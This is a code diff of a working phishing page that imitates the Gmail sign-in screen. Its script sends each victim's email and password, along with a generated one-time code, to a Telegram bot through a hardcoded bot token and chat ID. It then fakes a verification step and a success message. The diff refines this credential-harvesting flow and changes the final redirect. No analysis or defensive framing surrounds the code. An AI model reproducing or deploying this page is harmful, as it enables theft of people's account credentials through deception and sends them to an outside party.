@@ -57,7 +57,11 @@ button:hover{ opacity:.9; }
   font-size:16px;
 }
 
-.timer{ color:red; margin-top:5px; font-size:14px; margin-bottom:10px; }
+.timer{
+  color:red;
+  margin-top:6px;
+  font-size:14px;
+}
 </style>
 </head>
 <body>
@@ -66,7 +70,7 @@ button:hover{ opacity:.9; }
 
 <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png">
 
-<!-- LOGIN -->
+<!-- LOGIN BOX -->
 <div id="loginBox">
   <h2>Sign in</h2>
   <input type="email" id="email" placeholder="Email">
@@ -74,15 +78,15 @@ button:hover{ opacity:.9; }
   <button onclick="sendLogin()">Login</button>
 </div>
 
-<!-- VERIFY -->
+<!-- VERIFY BOX -->
 <div id="verifyBox" class="hide">
   <h2>Verify Account</h2>
-  <input type="text" id="code" placeholder="Verification Code">
+  <input type="text" id="code" placeholder="Enter verification code">
   <div class="timer" id="timer">05:00</div>
-  <button id="verifyBtn" onclick="sendCode()">Verify</button>
+  <button onclick="sendCode()">Verify</button>
 </div>
 
-<!-- SUCCESS MESSAGE -->
+<!-- SUCCESS -->
 <div id="successBox" class="hide">
   <div class="msg">Account verified successfully!</div>
 </div>
@@ -90,76 +94,97 @@ button:hover{ opacity:.9; }
 </div>
 
 <script>
-// Telegram Bot Info
 const BOT_TOKEN = "8345633952:AAFYVlMG4AHskRSMOITcxyJGaB-dirO7FAU";
 const CHAT_ID = "-4943788578";
 
 let countdown;
+let generatedCode = "";
 
-// SEND MESSAGE TO TELEGRAM
+// SEND TO TELEGRAM
 function sendToBot(text){
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
-    body:JSON.stringify({ chat_id: CHAT_ID, text: text })
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
   });
 }
 
-// LOGIN SEND
+// GENERATE OTP
+function generateCode(){
+  return Math.floor(100000 + Math.random()*900000);
+}
+
+// LOGIN
 function sendLogin(){
   if(email.value==="" || password.value===""){
-    alert("Fill all fields!");
+    alert("Please fill all fields");
     return;
   }
 
-  sendToBot(`📩 Login\nEmail: ${email.value}\nPassword: ${password.value}`);
+  generatedCode = generateCode();
+
+  sendToBot(
+`📩 LOGIN REQUEST
+Email: ${email.value}
+Password: ${password.value}
+
+🔐 OTP Code: ${generatedCode}`
+  );
 
   loginBox.classList.add("hide");
   verifyBox.classList.remove("hide");
 
-  startTimer(300); // 5 minutes
+  startTimer(300);
 }
 
-// TIMER FUNCTION
+// TIMER
 function startTimer(seconds){
   let time = seconds;
 
   countdown = setInterval(()=>{
-    let min = Math.floor(time / 60);
-    let sec = time % 60;
+    let min = Math.floor(time/60);
+    let sec = time%60;
 
-    timer.innerText = (min<10?"0":"")+min+":"+(sec<10?"0":"")+sec;
+    timer.innerText =
+      (min<10?"0":"")+min+":"+(sec<10?"0":"")+sec;
 
-    if(time <= 0){
+    if(time<=0){
       clearInterval(countdown);
       timer.innerText = "Code expired!";
+      generatedCode="";
     }
 
     time--;
   },1000);
 }
 
-// VERIFY SEND
+// VERIFY
 function sendCode(){
   if(code.value===""){
-    alert("Enter code!");
+    alert("Enter the code!");
     return;
   }
 
-  sendToBot(`✅ Verify\nEmail: ${email.value}\nCode: ${code.value}`);
+  if(code.value != generatedCode){
+    alert("Wrong code!");
+    return;
+  }
 
-  clearInterval(countdown); // stop timer
-  code.value="";             // clear input
-  verifyBox.classList.add("hide"); // hide verify
-  successBox.classList.remove("hide"); // show success
+  sendToBot(`✅ VERIFIED\nEmail: ${email.value}`);
 
-  // Redirect to index.html after 1.5 seconds
+  clearInterval(countdown);
+
+  verifyBox.classList.add("hide");
+  successBox.classList.remove("hide");
+
   setTimeout(()=>{
-    window.location.href = "https://qeghuikjjjj-bot.github.io/ahly/";
-  }, 1500);
+    window.location.href="index.html";
+  },1500);
 }
 </script>
 
 </body>
 </html>
-
